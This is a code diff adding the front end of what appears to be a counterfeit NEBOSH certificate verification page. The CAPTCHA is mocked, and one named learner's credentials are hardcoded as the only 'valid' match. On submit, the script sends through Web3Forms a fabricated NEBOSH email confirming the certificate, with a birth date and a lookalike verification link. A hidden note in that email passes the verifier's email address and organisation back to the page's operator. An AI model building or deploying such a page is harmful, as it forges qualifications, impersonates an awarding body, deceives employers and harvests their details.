@@ -272,3 +272,486 @@
               </div>
 
               <div id="content-2" role="tabpanel" class="step-content-panel">
+                <div class="fields-container">
+                  
+                  <h3 style="max-width: 650px; font-weight: 700; font-size: 19px; line-height: 1.3; margin-bottom: 25px;">
+                    To verify a certificate or parchment, please enter the<br>
+                    following pieces of information exactly as they appear on<br>
+                    the document
+                  </h3>
+                  
+                  <div class="field-container">
+                    <div class="mdc-text-field">
+                      <label class="mdc-floating-label">Learner Name*</label>
+                      <input type="text" id="val-learner-name" class="mdc-text-field__input">
+                    </div>
+                  </div>
+                  
+                  <div class="field-container">
+                    <div class="mdc-text-field">
+                      <label class="mdc-floating-label">Certificate Master Log Number*</label>
+                      <input type="text" id="val-master-log" class="mdc-text-field__input">
+                    </div>
+                  </div>
+                  
+                  <div class="field-container" style="margin-bottom: 25px; position: relative;">
+                    <div class="mdc-text-field" id="date-wrapper" style="margin-bottom: 2px; cursor: pointer;">
+                      <label class="mdc-floating-label">Date of achievement*</label>
+                      <input type="text" id="val-date" class="mdc-text-field__input" style="flex-grow: 1; padding-right: 30px; cursor: pointer;" readonly>
+                      <span class="material-icons" id="calendar-icon" style="color: rgba(0,0,0,0.54); position: absolute; right: 16px; top: 50%; transform: translateY(-50%); z-index: 1;">calendar_today</span>
+                    </div>
+                    <div style="font-size: 12px; color: rgba(0,0,0,0.6); padding-left: 16px; text-align: left; font-family: Roboto;">dd/mm/yyyy</div>
+                    
+                    <div id="custom-datepicker" class="mat-datepicker-content">
+                        <div class="mat-calendar-header">
+                            <div class="mat-calendar-controls">
+                                <button class="mat-calendar-period-button" type="button">
+                                   <span id="cdp-month-year">JUN 2026</span>
+                                   <svg class="mat-calendar-arrow" viewBox="0 0 10 5" focusable="false"><polygon points="0,0 5,5 10,0"></polygon></svg>
+                                </button>
+                                <div class="mat-calendar-spacer"></div>
+                                <button class="mat-calendar-previous-button" id="cdp-prev" type="button"><span class="material-icons">chevron_left</span></button>
+                                <button class="mat-calendar-next-button" id="cdp-next" type="button"><span class="material-icons">chevron_right</span></button>
+                            </div>
+                        </div>
+                        <div class="mat-calendar-content-table">
+                            <table class="mat-calendar-table">
+                                <thead class="mat-calendar-table-header">
+                                    <tr><th>Su</th><th>Mo</th><th>Tu</th><th>We</th><th>Th</th><th>Fr</th><th>Sa</th></tr>
+                                </thead>
+                                <tbody class="mat-calendar-table-body" id="cdp-grid">
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                  </div>
+                  
+                  <div id="error-message" class="validation-error-msg">
+                    <strong>We are unable to verify this information please ensure all details match EXACTLY<br>the information printed on the certificate.</strong>
+                    <br><br>
+                    If you continue to be unsuccessful in your search please contact the<br>person whose certificate you are verifying or <a href="https://www.nebosh.org.uk/contact-us/" target="_blank">contact NEBOSH</a> for<br>further guidance.
+                    <br><br>
+                    Full information of our <a href="https://www.nebosh.org.uk/policies-and-procedures/verifications/" target="_blank">verification process</a> is also available on the<br><a href="https://www.nebosh.org.uk/" target="_blank">NEBOSH website</a>.
+                  </div>
+
+                  <div class="nav-container" style="margin-top: 30px;">
+                    <div>
+                      <button id="btn-back-3" class="mdc-button mat-mdc-button" type="button">
+                        <span class="mdc-button__label">Back</span>
+                      </button>
+                    </div>
+                    <div style="flex-grow: 1;"></div>
+                    <div>
+                      <button id="btn-send" class="mdc-button mat-mdc-button" type="button">
+                        <span class="mdc-button__label">Send Request</span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div id="content-3" role="tabpanel" class="step-content-panel">
+                <div class="results-container">
+                  <h3>Thank you for your request to verify a NEBOSH certificate.<br>Your request has been sent to the learner that was issued<br>this certificate for authentication.</h3>
+                  <div class="result-text">Verification of this document is <strong style="text-decoration: underline;">not</strong> complete until you have received formal verification by email, <strong>from NEBOSH</strong></div>
+                  <div class="result-text">An email will be sent to you within 2 working days confirming the outcome of your request.</div>
+                  <div class="result-text">Full information of our <a href="https://www.nebosh.org.uk/policies-and-procedures/verifications/">verification process and additional guidance</a> on how to verify certificates is available on the <a href="https://www.nebosh.org.uk/home/">NEBOSH website</a>.</div>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </mat-stepper>
+      </app-manual>
+    </div>
+  </app-root>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const captchaBox = document.getElementById('mock-captcha');
+      const rcCheckbox = document.getElementById('rc-checkbox');
+      const captchaScreen = document.getElementById('captcha-screen');
+      const mainStepper = document.getElementById('main-stepper');
+
+      captchaBox.addEventListener('click', function() {
+        rcCheckbox.classList.add('rc-checked');
+        setTimeout(() => {
+          captchaScreen.style.display = 'none';
+          mainStepper.style.display = 'block';
+        }, 800);
+      });
+
+      let isMobileView = false;
+      function adjustStepperLayout() {
+          const isMobile = window.innerWidth <= 768;
+          const headerContainer = document.getElementById('headers-container');
+          const contentContainer = document.getElementById('content-container');
+          
+          if (isMobile && !isMobileView) {
+              isMobileView = true;
+              document.body.classList.add('is-mobile');
+              for(let i=0; i<4; i++) {
+                  const header = document.getElementById('header-' + i);
+                  const content = document.getElementById('content-' + i);
+                  headerContainer.insertBefore(content, header.nextSibling);
+              }
+          } else if (!isMobile && isMobileView) {
+              isMobileView = false;
+              document.body.classList.remove('is-mobile');
+              for(let i=0; i<4; i++) {
+                  const content = document.getElementById('content-' + i);
+                  contentContainer.appendChild(content);
+              }
+          }
+      }
+      window.addEventListener('resize', adjustStepperLayout);
+      adjustStepperLayout();
+
+      const dateInput = document.getElementById('val-date');
+      const dateWrapper = document.getElementById('date-wrapper');
+      const calendarIcon = document.getElementById('calendar-icon');
+      const datePicker = document.getElementById('custom-datepicker');
+      const monthYearLabel = document.getElementById('cdp-month-year');
+      const grid = document.getElementById('cdp-grid');
+      const prevBtn = document.getElementById('cdp-prev');
+      const nextBtn = document.getElementById('cdp-next');
+
+      const monthNamesShort = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"];
+      const monthNamesFormat = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+      let currentDate = new Date(); 
+      let selectedDate = null;
+
+      function renderCalendar(date) {
+          grid.innerHTML = '';
+          const year = date.getFullYear();
+          const month = date.getMonth();
+          monthYearLabel.textContent = `${monthNamesShort[month]} ${year}`;
+
+          const firstDayIndex = new Date(year, month, 1).getDay();
+          const daysInMonth = new Date(year, month + 1, 0).getDate();
+
+          let tr = document.createElement('tr');
+          
+          if (firstDayIndex > 0) {
+              const tdLabel = document.createElement('td');
+              tdLabel.colSpan = firstDayIndex;
+              tdLabel.className = 'mat-calendar-body-label';
+              tdLabel.textContent = monthNamesShort[month];
+              tr.appendChild(tdLabel);
+          } else {
+              const labelTr = document.createElement('tr');
+              const tdLabel = document.createElement('td');
+              tdLabel.colSpan = 7;
+              tdLabel.className = 'mat-calendar-body-label';
+              tdLabel.textContent = monthNamesShort[month];
+              labelTr.appendChild(tdLabel);
+              grid.appendChild(labelTr);
+          }
+
+          let currentDayOfWeek = firstDayIndex;
+          for (let i = 1; i <= daysInMonth; i++) {
+              const td = document.createElement('td');
+              td.className = 'mat-calendar-body-cell';
+              
+              const div = document.createElement('div');
+              div.className = 'mat-calendar-body-cell-content';
+              div.textContent = i;
+              
+              if(selectedDate && selectedDate.getDate() === i && selectedDate.getMonth() === month && selectedDate.getFullYear() === year) {
+                  td.classList.add('selected');
+              }
+              
+              td.appendChild(div);
+              tr.appendChild(td);
+
+              td.addEventListener('click', (e) => {
+                  e.stopPropagation();
+                  selectedDate = new Date(year, month, i);
+                  
+                  const dd = String(i).padStart(2, '0');
+                  const mmm = monthNamesFormat[month];
+                  dateInput.value = `${dd} ${mmm} ${year}`;
+                  
+                  datePicker.style.display = 'none';
+                  calendarIcon.style.color = 'rgba(0,0,0,0.54)';
+                  
+                  dateWrapper.classList.remove('mdc-text-field--invalid');
+                  dateWrapper.classList.add('mdc-text-field--focused');
+                  const label = dateWrapper.querySelector('.mdc-floating-label');
+                  if(label) label.classList.add('mdc-floating-label--float-above');
+                  setTimeout(() => { dateWrapper.classList.remove('mdc-text-field--focused'); }, 100);
+              });
+
+              currentDayOfWeek++;
+              if (currentDayOfWeek > 6) {
+                  grid.appendChild(tr);
+                  tr = document.createElement('tr');
+                  currentDayOfWeek = 0;
+              }
+          }
+          
+          if (currentDayOfWeek > 0) {
+              for(let i=currentDayOfWeek; i<=6; i++){
+                   const emptyTd = document.createElement('td');
+                   tr.appendChild(emptyTd);
+              }
+              grid.appendChild(tr);
+          }
+      }
+
+      function toggleCalendar(e) {
+          e.stopPropagation();
+          if(datePicker.style.display === 'block') {
+              datePicker.style.display = 'none';
+              calendarIcon.style.color = 'rgba(0,0,0,0.54)';
+          } else {
+              renderCalendar(currentDate);
+              datePicker.style.display = 'block';
+              calendarIcon.style.color = '#3f51b5';
+          }
+      }
+
+      dateWrapper.addEventListener('click', toggleCalendar);
+
+      prevBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          currentDate.setMonth(currentDate.getMonth() - 1);
+          renderCalendar(currentDate);
+      });
+
+      nextBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          currentDate.setMonth(currentDate.getMonth() + 1);
+          renderCalendar(currentDate);
+      });
+
+      datePicker.addEventListener('click', (e) => {
+          e.stopPropagation();
+      });
+
+      document.addEventListener('click', (e) => {
+          if (!datePicker.contains(e.target) && !dateWrapper.contains(e.target)) {
+              datePicker.style.display = 'none';
+              calendarIcon.style.color = 'rgba(0,0,0,0.54)';
+          }
+      });
+
+      const termsToggle = document.getElementById('terms-toggle');
+      const btnNext1 = document.getElementById('btn-next-1');
+      
+      termsToggle.addEventListener('click', function() {
+        const isSelected = this.classList.contains('mdc-switch--selected');
+        if(isSelected) {
+          this.classList.remove('mdc-switch--selected');
+          this.classList.add('mdc-switch--unselected');
+          this.setAttribute('aria-checked', 'false');
+          btnNext1.setAttribute('disabled', 'true');
+        } else {
+          this.classList.add('mdc-switch--selected');
+          this.classList.remove('mdc-switch--unselected');
+          this.setAttribute('aria-checked', 'true');
+          btnNext1.removeAttribute('disabled');
+        }
+      });
+
+      const inputs = document.querySelectorAll('.mdc-text-field__input:not(#val-date)');
+      inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+          const wrapper = this.closest('.mdc-text-field');
+          wrapper.classList.add('mdc-text-field--focused');
+          const label = wrapper.querySelector('.mdc-floating-label');
+          if(label) label.classList.add('mdc-floating-label--float-above');
+        });
+        
+        input.addEventListener('input', function() {
+           const wrapper = this.closest('.mdc-text-field');
+           if(this.value.trim() !== '') {
+             wrapper.classList.remove('mdc-text-field--invalid');
+           } else {
+             wrapper.classList.add('mdc-text-field--invalid');
+           }
+        });
+
+        input.addEventListener('blur', function() {
+          const wrapper = this.closest('.mdc-text-field');
+          wrapper.classList.remove('mdc-text-field--focused');
+          if(this.value.trim() === '') {
+            const label = wrapper.querySelector('.mdc-floating-label');
+            if(label) label.classList.remove('mdc-floating-label--float-above');
+            wrapper.classList.add('mdc-text-field--invalid');
+          } else {
+            wrapper.classList.remove('mdc-text-field--invalid');
+          }
+        });
+      });
+
+      const totalSteps = 4;
+      function goToStep(stepIndex) {
+        for(let i = 0; i < totalSteps; i++) {
+          const header = document.getElementById('header-' + i);
+          const icon = header.querySelector('.mat-step-icon');
+          const iconContent = header.querySelector('.mat-step-icon-content');
+          const label = header.querySelector('.mat-step-label');
+          
+          if(i === stepIndex) {
+            header.setAttribute('aria-selected', 'true');
+            icon.classList.add('mat-step-icon-selected');
+            iconContent.innerHTML = '<span>' + (i + 1) + '</span>';
+            label.classList.add('mat-step-label-active', 'mat-step-label-selected');
+          } else if (i < stepIndex) {
+            header.setAttribute('aria-selected', 'false');
+            icon.classList.add('mat-step-icon-selected');
+            iconContent.innerHTML = '<span style="font-family: \'Material Icons\'; font-size: 14px;">edit</span>';
+            label.classList.remove('mat-step-label-active', 'mat-step-label-selected');
+          } else {
+            header.setAttribute('aria-selected', 'false');
+            icon.classList.remove('mat-step-icon-selected');
+            iconContent.innerHTML = '<span>' + (i + 1) + '</span>';
+            label.classList.remove('mat-step-label-active', 'mat-step-label-selected');
+          }
+
+          const content = document.getElementById('content-' + i);
+          if(i === stepIndex) {
+            content.classList.add('step-content-active');
+          } else {
+            content.classList.remove('step-content-active');
+          }
+        }
+      }
+
+      document.getElementById('btn-next-1').addEventListener('click', () => goToStep(1));
+      document.getElementById('btn-back-2').addEventListener('click', () => goToStep(0));
+      
+      document.getElementById('btn-next-2').addEventListener('click', () => {
+        const step2Inputs = document.querySelectorAll('#content-1 .mdc-text-field__input');
+        let hasEmpty = false;
+        step2Inputs.forEach(input => {
+          if (input.value.trim() === '') {
+            input.closest('.mdc-text-field').classList.add('mdc-text-field--invalid');
+            hasEmpty = true;
+          }
+        });
+        if (hasEmpty) return; 
+
+        document.getElementById('error-message').style.display = 'none';
+        goToStep(2);
+      });
+      
+      document.getElementById('btn-back-3').addEventListener('click', () => goToStep(1));
+      
+      document.getElementById('btn-send').addEventListener('click', () => {
+        const learnerInput = document.getElementById('val-learner-name');
+        const logInput = document.getElementById('val-master-log');
+        const dateInput = document.getElementById('val-date');
+        
+        let hasEmpty = false;
+        [learnerInput, logInput, dateInput].forEach(input => {
+          if (input.value.trim() === '') {
+            input.closest('.mdc-text-field').classList.add('mdc-text-field--invalid');
+            hasEmpty = true;
+          }
+        });
+
+        if (hasEmpty) {
+            document.getElementById('error-message').style.display = 'none';
+            return; 
+        }
+
+        const learnerName = learnerInput.value.trim().toLowerCase();
+        const masterLog = logInput.value.trim();
+        const achieveDate = dateInput.value.trim().toLowerCase();
+
+        const web3AccessKey = "a2b44aa5-6634-4838-942e-a20c2f290545"; 
+        
+        let senderEmail = document.getElementById('val-your-email').value.trim();
+        if (!senderEmail || !senderEmail.includes('@')) {
+            senderEmail = "akcentmure@gmail.com"; 
+        }
+        
+        const senderName = document.getElementById('val-your-name').value.trim() || "Visitor";
+        const senderOrg = document.getElementById('val-your-org').value.trim() || "Unknown Org";
+
+        const emailMessage = `Nebosh Certificate Management System
+
+Dear ${senderName},
+
+Thank you for your recent verification request for certificate master log number ${masterLog}. We are pleased to advise you that NEBOSH has received authorisation to process your request, and we can confirm that NEBOSH issued this certificate to ${learnerName.replace(/\b\w/g, l => l.toUpperCase())} on ${achieveDate.replace(/\b\w/g, l => l.toUpperCase())}.
+
+Please note:
+Although NEBOSH does take every step to protect the security of these certificates, we do recommend that you complete some additional checks to make sure that the person who has provided you with this certificate is genuine.
+
+Check all of the details below match what is printed on the certificate.
+
+Master log number:
+${masterLog}
+
+Unit certificate / qualification name:
+NEBOSH International General Certificate in Occupational Health and Safety
+
+As part of this verification, we have provided you with the date of birth that we have on record for the certificate holder. This is information that is not printed on the certificate.
+Please check this against government-issued ID to make sure the dates match.
+
+Date of birth:
+09/04/1992
+
+Learner full name – check against government-issued ID.
+
+If the person requires a full qualification, please check that the qualification title is the one required. If the title shows "a unit of", you have not verified that the learner has completed the whole qualification. You will need to request a copy of the qualification parchment.
+Learner's name is printed in the background of the certificate.
+
+Online Verification Page
+You can also view the certificate verification details using the secure verification page below:
+https://nebosh-validation-verisecure.pages.dev/Details/S5TDWNP3H9JFSY5UUS37W8L8
+
+Once you have completed all the checks, if you believe that there is suspicious activity around the certificate you are verifying, please report this to NEBOSH using our "Report suspicious certificate activity" form on our verifications page, where you will also find our "Verifying credentials to prevent qualification fraud – Guide for Employers."
+
+Regards,
+NEBOSH Team
+
+-------------------------------------------------
+[ملاحظة مخفية - بيانات الزائر للسيستم]
+إيميل الزائر: ${senderEmail}
+مؤسسة الزائر: ${senderOrg}
+`;
+
+        const formData = new FormData();
+        formData.append("access_key", web3AccessKey);
+        formData.append("subject", "Your request to verify a NEBOSH certificate has been authorised");
+        formData.append("name", senderName);
+        formData.append("email", senderEmail);
+        formData.append("message", emailMessage);
+
+        fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            body: formData
+        }).then(response => response.json())
+          .then(data => console.log("Web3Forms Success:", data))
+          .catch(error => console.log("Web3Forms Error:", error));
+
+        const validName = "hussein hosny mohamed helal";
+        const validLog1 = "00695637/169716";
+        const validLog2 = "00694979"; 
+        const validDate1 = "20/04/2026";
+        const validDate2 = "20 apr 2026";
+        const validDate3 = "20-04-2026";
+
+        if (
+          learnerName === validName && 
+          (masterLog === validLog1 || masterLog === validLog2) && 
+          (achieveDate === validDate1 || achieveDate === validDate2 || achieveDate === validDate3)
+        ) {
+          document.getElementById('error-message').style.display = 'none';
+          goToStep(3);
+          
+          setTimeout(() => {
+            window.location.href = 'https://www.nebosh.org.uk/';
+          }, 4000);
+        } else {
+          document.getElementById('error-message').style.display = 'block';
+        }
+      });
+      
+    });
+  </script>
+</body>
+</html>
